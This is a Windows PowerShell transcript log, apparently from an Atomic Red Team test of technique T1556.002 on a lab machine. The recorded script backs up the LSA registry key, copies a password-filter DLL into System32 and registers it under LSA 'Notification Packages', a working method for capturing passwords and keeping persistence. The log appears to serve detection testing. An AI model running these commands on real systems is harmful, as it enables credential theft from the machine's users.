**********************
Windows PowerShell 脚本开始
开始时间: 20230411155204
用户名: DESKTOP-SP5BHV2\wangjian
RunAs 用户: DESKTOP-SP5BHV2\wangjian
配置名称: 
计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
主机应用程序: powershell.exe & {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg
$passwordFilterName = (Copy-Item "C:\AtomicRedTeam\atomics\T1556.002\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ "Notification Packages" $notificationPackagesValues}
进程 ID: 5428
PSVersion: 5.1.19041.2673
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
BuildVersion: 10.0.19041.2673
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
PS>& {reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg
$passwordFilterName = (Copy-Item "C:\AtomicRedTeam\atomics\T1556.002\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues}

PS>$global:?
True
**********************
Windows PowerShell 脚本结束
结束时间: 20230411155204
**********************
